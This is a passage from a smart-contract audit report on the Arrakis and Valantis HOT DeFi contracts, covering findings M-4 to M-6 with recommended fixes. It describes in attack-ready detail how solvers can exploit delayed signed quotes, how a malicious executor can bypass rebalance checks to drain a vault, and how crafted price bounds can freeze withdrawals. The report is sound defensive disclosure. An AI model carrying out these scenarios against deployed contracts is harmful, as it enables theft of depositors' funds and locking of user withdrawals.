## Code Snippet

https://github.com/sherlock-audit/2024-03-arrakis/blob/main/arrakis-modular/src/ArrakisPublicVaultRouter.sol#L122-L191

https://github.com/sherlock-audit/2024-03-arrakis/blob/main/arrakis-modular/src/ArrakisPublicVaultRouter.sol#L869-L901

https://github.com/sherlock-audit/2024-03-arrakis/blob/main/arrakis-modular/src/ArrakisPublicVaultRouter.sol#L1194-L1231

https://github.com/sherlock-audit/2024-03-arrakis/blob/main/arrakis-modular/src/ArrakisMetaVaultPublic.sol#L51-L74

https://github.com/sherlock-audit/2024-03-arrakis/blob/main/arrakis-modular/src/ArrakisMetaVaultPublic.sol#L137-L154

https://github.com/sherlock-audit/2024-03-arrakis/blob/main/arrakis-modular/src/modules/ValantisHOTModulePublic.sol#L35-L96

## Tool used

Manual Review

## Recommendation

The `ArrakisPublicVaultRouter._getMintAmounts()` function should be updated to return the accurate required amounts.

# Issue M-4: Insufficient swap price validation means that solvers can their use signed quotes as free options, causing losses to the LP 

Source: https://github.com/sherlock-audit/2024-03-arrakis-judging/issues/69 

## Found by 
kfx
## Summary

Under conditions where only the first HOT swap in a block gets a discount, there's little incentive to submit the remaining signed quotes for inclusion immediately. Instead, rational solvers can be expected to delay as long as possible, and exercise their free "option" only when it's profitable to them, causing systemic losses to the LP.  The losses can be quite big even for a single swap, as the price a non-discounted HOT swap is executed is not directly validated against the current price of the AMM.

## Vulnerability Detail

The protocol is designed to support multiple active HOT quotes, as evidenced by the fact the "non-discounted HOT swap" concept exists. Depending on the order the quotes land on the chain, the first is expected to be performed as a discounted swap, the others as non-discounted HOT swaps. For discounted swaps, the execution price can be "better" than the fair price of the asset, by design. In return, these swaps perform AMMs price synchronization with external venues, as a service. Sponsor's comment from Discord:
> we need solvers in HOT for landing flashswap on chain, flashswap has market datas to change liquidity and amm price to the market price. [..] In exchange of this service, they will get a deterministic competitive fixed price for doing a swap

Non-discounted swaps do not perform this service, and therefore should be executed at a worse price, at or close to the fair trading price. 

Discounted swaps are expected to be included as soon as possible, as long as there's at least two competing solvers, because delaying them let's the other solver to be first and get the profit from the swap. However, once solver has got frontrun by another solver, they have little incentive to include their non-discounted HOT swap immediately. (It's possible to detect such a frontrun by e.g. enclosing the swap in a transaction that checks the `amountOut` and reverts if the discount was not applied - using private RPCs normally ensures that reverting transactions are not included in blocks.) Instead, a profitable strategy for the solver is to wait as long as possible, and only include the HOT swap if has a good price relative to the market price at the end of the waiting period.

The signed quote that the solver has essentially becomes a free option, given out by the protocol at no cost. The default expiry time for quotes can be quite long, with `maxDelay` expected to be set to 10 min (according to the docs) or 20 min (value in the deployment script). The asset's price can easily change by several % during these minutes. The solver can wait for `expiry - epsilon` seconds (where `epsilon` is a small number, depending on the chain's block time), and check the new asset's price on a CEX, and make a non-atomic arbitrage between the CEX and the Valantis pool.

Even if the `expiry` is set to a very small value by the signer, it cannot fully prevent the problem, although it does reduce it greatly! Even expiry time of zero is still theoretically arbitrageable on some L2s, including Arbitrum, that can have multiple blocks per second. On Arbitrum a block is generated whenever there are outstanding transactions, with min 250 ms interval. As result, the unfilled quote is still a free option, albeit with expiry time of less than a second. Delaying the choice whether to submit the quote is still expected to give some profit at the expense of the LP if the CEX price rapidly moves in one direction.

The signer can detect this behavior and blacklist such a solver. However, it may not easy to do so, as the solvers can pretend to have honest delays due to some setup issues, and/or perform this attack only occasionally.

Notably, the execution price of the HOT swap is not validated against the current AMM price in the `validatePriceConsistency` function, enabling quotes that have significantly worse price than the current AMM price to be executed, even if they are not classified as discounted.

## Impact

The LP is going to suffer systemic losses if multiple solvers are permitted to get signed quotes at the same time.
(If only one solver is permitted to get a signed quote at a time, the system is not going to be competitive.)

## Code Snippet

https://github.com/sherlock-audit/2024-03-arrakis/blob/main/valantis-hot/src/HOT.sol#L956
https://github.com/sherlock-audit/2024-03-arrakis/blob/main/valantis-hot/src/libraries/HOTParams.sol#L114

In a HOT swap, `hot.sqrtSpotPriceX96New` is always used as argument for `validatePriceConsistency` even though it's only applied if `isDiscountedHot` is true:
```solidity
    function _hotSwap(
        ALMLiquidityQuoteInput memory almLiquidityQuoteInput,
        bytes memory externalContext,
        ALMLiquidityQuote memory liquidityQuote
    ) internal {
        // ...
        HOTParams.validatePriceConsistency(
            _ammState,
            sqrtHotPriceX96,
            hot.sqrtSpotPriceX96New,  // @audit
            getSqrtOraclePriceX96(),
            hotReadSlot.maxOracleDeviationBipsLower,
            hotReadSlot.maxOracleDeviationBipsUpper,
            _hotMaxDiscountBipsLower,
            _hotMaxDiscountBipsUpper
        );
        // ...
        // Only update the pool state, if this is a discounted hot quote
        if (isDiscountedHot) {
            // ...
            // Update AMM sqrt spot price
            _ammState.setSqrtSpotPriceX96(hot.sqrtSpotPriceX96New);
        }
    }
```
## PoC

Let's say that at timestamp `T`, the "true" price of the asset is P, and the AMM's price is 0.98*P. The signer may issue multiple quotes with that timestamp, Q1 and Q2, to two competing solvers S1 and S2:

```text
Q1.sqrtHotPriceX96Discounted = 0.99*P
Q1.sqrtHotPriceX96Base       = 0.995*P
Q1.sqrtSpotPriceX96New       = P
Q1.nonce                     = 1
Q1.signatureTimestamp        = T
Q1.expiry                    = 60

Q2.sqrtHotPriceX96Discounted = 0.99*P
Q2.sqrtHotPriceX96Base       = 0.995*P
Q2.sqrtSpotPriceX96New       = P
Q2.nonce                     = 2
Q2.signatureTimestamp        = T
Q2.expiry                    = 60
```
The intention is that both quotes can be executed, so their nonces are different. Let's assume that in the block with timestamp T, a swap with the quote Q1 gets included, as a discounted swap, with execution price 0.99 P, and after-swap price of P.

S2 has the initiative to delay the execution of Q2. S2 waits for 60 - 12 seconds, and checks CEX price of the asset. Let's assume that its 1.05 P.

S2 now submits their swap with Q2 for inclusion. The prices are validated in `validatePriceConsistency` function.

First `sqrtHotPriceX96Base` is compared with `sqrtSpotPriceNewX96`. This obviously passes (because we know that Q1 was valid, and the price difference is smaller for Q2).

Then the AMM price `sqrtSpotPriceX96` is compared with `sqrtOraclePriceX96`. Let's say the oracle is lagging slightly, at 1.03 P, but the `maxOracleDeviationBipsUpper` is set such that the check passes (e.g. to 200).

Then `sqrtSpotPriceNewX96` (P) is compared with `sqrtOraclePriceX96` (1.03 P). Let's say again the `maxOracleDeviationBipsLower` is set such that the check passes (e.g. to 300).

As a result, the swap is considered valid, even though the AMM price is almost 6% higher than the HOT execution price (1.05 P vs. 0.995 P).

Nowhere in the process is the execution price is directly compared with either the oracle price, or the current AMM price.


## Tool used

Manual Review

## Recommendation

* directly validate the execution price of non-discounted HOT swaps against the current AMM price, to prohibit execution at significantly worse prices
* carefully choose appropriate values for the `expiry` argument
* consider adding a mechanism that lets the signer to invalidate all previously issues signed quotes



## Discussion

**0xffff11**

Sounds like an non-issue, deviation bound checks are respected.
The team has already specified that parameters would be set safely.

# Issue M-5: ArrakisStandardManager::rebalance Malicious executor can bypass slippage check and steal funds from a public vault 

Source: https://github.com/sherlock-audit/2024-03-arrakis-judging/issues/76 

## Found by 
KupiaSec, cergyk, juaan
## Summary

A malicious executor can bypass the reserves checks at the end of `ArrakisStandardManager::rebalance`, by using a malicious contract as `_router` during a `ValantisModule::swap` call and using it to deposit through `ArrakisPublicVaultRouter::addLiquidity`. This would increase reserves temporarily in order to pass the checks, but the added funds can be withdrawn by the executor after `rebalance` is done.

## Vulnerability Detail

### Checks preventing funds extraction by executor

There are two levels of checks to bypass in order to accomplish the full attack:

1/ Slippage checks in `ValantisModule::swap` limit slippage for a given swap operated by the `router` to a reasonable value (let's assume 1%):

- check `expectedMinReturn`: [ValantisHOTModule.sol#L335-L342](https://github.com/sherlock-audit/2024-03-arrakis/blob/main/arrakis-modular/src/abstracts/ValantisHOTModule.sol#L335-L342)

- and then:
[ValantisHOTModule.sol#L384-L397](https://github.com/sherlock-audit/2024-03-arrakis/blob/main/arrakis-modular/src/abstracts/ValantisHOTModule.sol#L384-L397)


2/ Reserves held by the pool are checked at the end of rebalance:
[ArrakisStandardManager.sol#L391-L414](https://github.com/sherlock-audit/2024-03-arrakis/blob/main/arrakis-modular/src/ArrakisStandardManager.sol#L391-L414)


### Bypassing the checks

Let's see how to bypass these checks:

1/ Since we are allowed an unlimited number of arbitrary calls to the module during `rebalance`, we can use many `swap`s each incurring an allowed 1% slippage (which is going to the attacker).
This means that for 50 swaps approx 40% of the TVL of the vault is out:
[ArrakisStandardManager.sol#L364-L379](https://github.com/sherlock-audit/2024-03-arrakis/blob/main/arrakis-modular/src/ArrakisStandardManager.sol#L364-L379)

> Alternatively one could manipulate the pool to incur slippage on the `depositLiquidity` call in `swap`, since the slippage controls are controlled by the `executor`:
[ValantisHOTModule.sol#L406-L411](https://github.com/sherlock-audit/2024-03-arrakis/blob/main/arrakis-modular/src/abstracts/ValantisHOTModule.sol#L406-L411)


2/ Now that an arbitrary amount of funds is extracted from the pool, we need to use one last call on the module, in order to `addLiquidity` via the `ArrakisPublicVaultRouter` and inflate reserves. 

To do so, we execute a `ValantisModule::swap`, with `amountIn` being zero, and use an attacker provided contract as `router` to call on `ArrakisPublicVaultRouter::addLiquidity`.

The deposited funds will increase the reserves back to their initial values, except the executor can withdraw these funds after rebalance is done.


## Impact

Theft of arbitrary amount of funds from public vaults by a malicious executor

## Scenario

1. The malicious executor calls `ArrakisStandardManager::rebalance` with a crafted `payloads_` that includes:
- 50 calls to `module::swap` with an attacker controlled `routerA`, each keeping 1% of `amountIn` and sending `tokenOut`
- 1 call to `module::swap` with attacker controlled `routerB`, which calls on `ArrakisPublicVaultRouter::addLiquidity` and deposits the missing liquidity back, but claimable by the attacker

2. The malicious executor calls `ArrakisPublicVaultRouter::removeLiquidity`, and withdraws 40% of the available reserves in the router

## Code Snippet

- [ArrakisStandardManager.sol#L376](https://github.com/sherlock-audit/2024-03-arrakis/blob/64a7dc6ccb5de2824870474a9f35fd3386669e89/arrakis-modular/src/ArrakisStandardManager.sol#L376)

## Tool used

Manual Review

## Recommendation

1/ Instead of checking available reserves at the end of `ArrakisStandardManager::rebalance`, please consider checking the share price `reserves/totalSupply`

> a private vault does not implement ERC20 and does not keep accounting of shares, so a virtual arbitrary share value such as `1e18` can be used.
> This is safe because it is considered that only the private vault owner can deposit into a private vault, so this means that the executor should not be able to do step 2. above.

2/ Additionally, one can add deviation checks on slippage controls provided by the executor here:
[ValantisHOTModule.sol#L406-L411](https://github.com/sherlock-audit/2024-03-arrakis/blob/main/arrakis-modular/src/abstracts/ValantisHOTModule.sol#L406-L411)

3/ Finally, add a whitelist of approved routers for handling swaps in modules.

# Issue M-6: HOT::setPriceBounds Malicious executor can brick vault withdrawals for at least 2 days 

Source: https://github.com/sherlock-audit/2024-03-arrakis-judging/issues/79 

## Found by 
cergyk
## Summary

The `HOT::setPriceBounds` function in the HOT contract allows an executor to set the AMM position's square-root upper and lower price bounds. A malicious executor can exploit this function to set the bounds very close together, causing an uint128 overflow when calculating liquidity. This results in disabling vault withdrawals, requiring a timelock of 2 days to set a new executor and re-enable vault withdrawals (by setting other price bounds).

## Vulnerability Detail

> Please note that this exploit currently works for all pools with at least one rebasing token.

The `HOT::setPriceBounds` function can be used by the executor to set the AMM position's square-root upper and lower price bounds: [HOT.sol#L520-L574](https://github.com/sherlock-audit/2024-03-arrakis/blob/64a7dc6ccb5de2824870474a9f35fd3386669e89/valantis-hot/src/HOT.sol#L520-L574).

A malicious executor can set `_sqrtPriceLowX96` and `_sqrtPriceHighX96` very close together. The following constraint is checked: `_sqrtPriceLowX96` < `sqrtPriceSpotX96` < `_sqrtPriceHighX96`, so they must be spaced by at least `2`: [HOTParams.sol#L177-L180](https://github.com/sherlock-audit/2024-03-arrakis/blob/64a7dc6ccb5de2824870474a9f35fd3386669e89/valantis-hot/src/libraries/HOTParams.sol#L177-L180).

If the difference is so small, while computing liquidity in `_calculateAMMLiquidity()`, the cast `toUint128` in [LiquidityAmounts.sol#L31](https://github.com/Uniswap/v3-periphery/blob/b325bb0905d922ae61fcc7df85ee802e8df5e96c/contracts/libraries/LiquidityAmounts.sol#L31) would revert even for small amounts.

> While setting price bounds the executor has to compute values close enough to the limit, but not overflowing, so the `_calculateAMMLiquidity()` at the end of `setPriceBounds()` succeeds: [HOT.sol#L571](https://github.com/sherlock-audit/2024-03-arrakis/blob/64a7dc6ccb5de2824870474a9f35fd3386669e89/valantis-hot/src/HOT.sol#L571).

As the call to `setPriceBounds` has succeeded, the executor can donate a small amount of rebasing token directly to the pool. As the reserve of rebasing token is the balance of this token, this makes all subsequent calls to `_calculateAMMLiquidity` revert.

As a result, all functions of HOT.sol become unusable, but most notably the `withdrawals` since this means that user funds are locked during that time. 

The executor has then to donate a small amount of the rebasing token to the pool.
This would result in the returned `uint128 liquidity` to overflow (even for reasonable values of `amount0` and `sqrtRatioAX96`): [LiquidityAmounts.sol#L31](https://github.com/Uniswap/v3-periphery/blob/b325bb0905d922ae61fcc7df85ee802e8df5e96c/contracts/libraries/LiquidityAmounts.sol#L31), [LiquidityAmounts.sol#L48](https://github.com/Uniswap/v3-periphery/blob/b325bb0905d922ae61fcc7df85ee802e8df5e96c/contracts/libraries/LiquidityAmounts.sol#L48), thus bricking vault withdrawals.

### Example:

Given:

- `sqrtRatioAX96` = 1 << 96
- `sqrtRatioBX96` = 1 << 96 + 2

It would overflow for a `amount` equal to 2 ** 33 (which is smaller than 1 ether == 10**18).

To unbrick the vault withdrawals, an owner would have to set a new executor who would set new price bounds, which means a timelock of 2 days has to pass.

## Impact

Vault withdrawals would be bricked for at least 2 days.

## Code Snippet

- [HOT.sol#L1015-L1024](https://github.com/sherlock-audit/2024-03-arrakis/blob/64a7dc6ccb5de2824870474a9f35fd3386669e89/valantis-hot/src/HOT.sol#L1015-L1024)

## Tool used

Manual Review

## Recommendation

Implement additional constraints on the `setPriceBounds` function to ensure that the `_sqrtPriceLowX96` and `_sqrtPriceHighX96` values cannot be set too close together, preventing potential overflow in the liquidity calculation.

> UniswapV3 naturally does not have this issue, since price ranges can only lie on ticks

